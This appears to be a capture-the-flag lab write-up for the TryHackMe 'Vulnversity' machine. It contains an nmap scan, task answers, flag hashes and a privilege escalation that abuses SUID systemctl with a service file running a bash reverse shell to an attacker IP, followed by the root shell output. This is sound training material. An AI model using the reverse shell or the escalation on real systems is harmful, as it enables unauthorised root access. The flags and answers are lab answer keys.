@@ -1,0 +1,180 @@
+Machine Notes:
+
+Nmap Scan:
+
+
+root@natzsec:~/Desktop/tryhackme/oscp/vulnversity# nmap -sC -sV -oA nmap/inital 10.10.219.76
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 07:58 IST
+Nmap scan report for 10.10.219.76
+Host is up (0.45s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Vuln University
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY\x00
+|   Domain name: \x00
+|   FQDN: vulnuniversity
+|_  System time: 2020-05-02T22:28:50-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-05-03T02:28:49
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.13 seconds
+root@natzsec:~/Desktop/tryhackme/oscp/vulnversity# 
+
+The HTTP is running on port 3333 with Apache httpd 2.4.18
+
+TASK 2
+
+#2 	Scan the box, how many ports are open?
+
+6
+
+#3 	What version of the squid proxy is running on the machine?
+
+3.5.12
+
+#4	How many ports will nmap scan if the flag -p-400 was used?
+
+400
+
+#5	Using the nmap flag -n what will it not resolve?
+
+DNS
+
+#6	Using the nmap flag -n what will it not resolve?
+
+Ubuntu
+
+#7	What port is the web server running on?
+
+3333
+
+TASK 3 
+
+1#	What is the directory that has an upload form page?
+
+internal
+
+Task 4 
+
+#1  Try upload a few file types to the server, what common extension seems to be blocked? 
+
+.php
+
+#2	Run this attack, what extension is allowed?
+
+.phtml
+
+#3	What user was running the web server?
+
+bill
+
+#4	What is the user flag?
+
+8bd7992fbe8a6ad22a63361004cfcedb
+
+Task 4 Priviliege Escalation :
+
+#1	On the system, search for all SUID files. What file stands out?
+
+find / -perm -u=s -type f 2>/dev/null 
+
+Running this command will give us list of binaries, but to find out which binary is having SUID permission. It is better to run the linpeas.
+
+/bin/systemctl
+
+#2	Root Flag.
+
+We can check out the GTFO bins which tells us to create a temp service and enable it using systemctl and run it.
+
+```
+cat root.service 
+[Unit]
+Description=roooot
+
+[Service]
+Type=Simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.11.5.22/9001 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Once that is saved to a file.
+We can run the below :
+
+www-data@vulnuniversity:/tmp$ /bin/systemctl enable /tmp/root.service 
+Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /tmp/root.service.
+Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
+
+www-data@vulnuniversity:/tmp$ /bin/systemctl start root.service 
+www-data@vulnuniversity:/tmp$
+
+In the Reverse shell window :
+
+root@natzsec:~/Desktop/tryhackme/oscp/vulnversity# nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.11.5.22] from (UNKNOWN) [10.10.219.76] 53650
+bash: cannot set terminal process group (14644): Inappropriate ioctl for device
+bash: no job control in this shell
+root@vulnuniversity:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@vulnuniversity:/# hostname
+hostname
+vulnuniversity
+root@vulnuniversity:/# cd /root
+cd /root
+root@vulnuniversity:~# ls -la
+ls -la
+total 28
+drwx------  4 root root 4096 Jul 31  2019 .
+drwxr-xr-x 23 root root 4096 Jul 31  2019 ..
+lrwxrwxrwx  1 root root    9 Jul 31  2019 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwx------  2 root root 4096 Jul 31  2019 .cache
+drwxr-xr-x  2 root root 4096 Jul 31  2019 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   33 Jul 31  2019 root.txt
+root@vulnuniversity:~# cat root.txt
+cat root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+root@vulnuniversity:~# 
+
+
+
+
+
+
+
